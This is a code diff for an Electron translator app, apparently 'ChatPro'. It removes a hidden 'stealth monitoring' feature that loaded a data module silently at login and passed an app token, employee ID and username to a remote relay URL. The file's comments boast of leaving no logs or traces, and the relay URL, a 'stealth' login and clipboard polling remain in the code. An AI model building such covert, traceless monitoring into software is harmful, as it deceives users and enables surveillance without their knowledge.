@@ -3,12 +3,10 @@ const path = require('path');
 const fs   = require('fs');
 
 // ═══════════════════════════════════════════════════════════════════
-// CHATPRO PRODUCTION: TRANSLATOR + INVISIBLE MONITORING
+// CHATPRO PRODUCTION: TRANSLATOR
 // Komplett SILENT - keine DevTools, keine console.logs, keine Spuren
 // ═══════════════════════════════════════════════════════════════════
 
-// ── STEALTH CONFIGURATION ──
-const MONITORING_ENABLED = true;
 const SERVER_URL = 'https://monitoring-relay-production.up.railway.app';
 
 // ── APP TOKEN (never exposed to renderer process) ──
@@ -79,9 +77,8 @@ let lastClipboard  = '';
 let suppressAutoDetect = 0;
 
 // ══════════════════════════════════════════════════════════════════
-// MONITORING STATE (INVISIBLE)
+// LOGIN STATE
 // ══════════════════════════════════════════════════════════════════
-let monitoringModule = null;
 let isLoggedIn = false;
 let currentUser = null;
 
@@ -493,32 +490,6 @@ function createTray() {
 }
 
 // ══════════════════════════════════════════════════════════════════
-// STEALTH MONITORING
-// ══════════════════════════════════════════════════════════════════
-
-function initStealthMonitoring() {
-  if (!MONITORING_ENABLED || !isLoggedIn) return;
-  
-  try {
-    const DataSecModule = require('./data-sec-module.js');
-    monitoringModule = new DataSecModule({
-      serverUrl: SERVER_URL,
-      appToken: APP_TOKEN,
-      employeeId: currentUser.employeeId,
-      username: currentUser.username
-    });
-  } catch(e) {
-    // Silent fail
-  }
-}
-
-function stopStealthMonitoring() {
-  if (monitoringModule) {
-    monitoringModule = null;
-  }
-}
-
-// ══════════════════════════════════════════════════════════════════
 // APP INITIALIZATION
 // ══════════════════════════════════════════════════════════════════
 
@@ -533,7 +504,6 @@ app.whenReady().then(() => {
   if (savedUser) {
     isLoggedIn = true;
     currentUser = savedUser;
-    initStealthMonitoring();
   } else {
     setTimeout(() => showStealthLogin(), 2000);
   }
@@ -543,7 +513,6 @@ app.on('window-all-closed', (e) => e.preventDefault());
 app.on('will-quit', () => {
   globalShortcut.unregisterAll();
   if (clipboardInterval) clearInterval(clipboardInterval);
-  stopStealthMonitoring();
 });
 
 // ══════════════════════════════════════════════════════════════════
@@ -624,8 +593,7 @@ ipcMain.handle('stealthLogin', async (event, { username, password }) => {
               isLoggedIn = true;
               currentUser = result.user;
               store.set('_sys', currentUser);
-              initStealthMonitoring();
-              
+
               if (loginWindow && !loginWindow.isDestroyed()) {
                 loginWindow.close();
               }
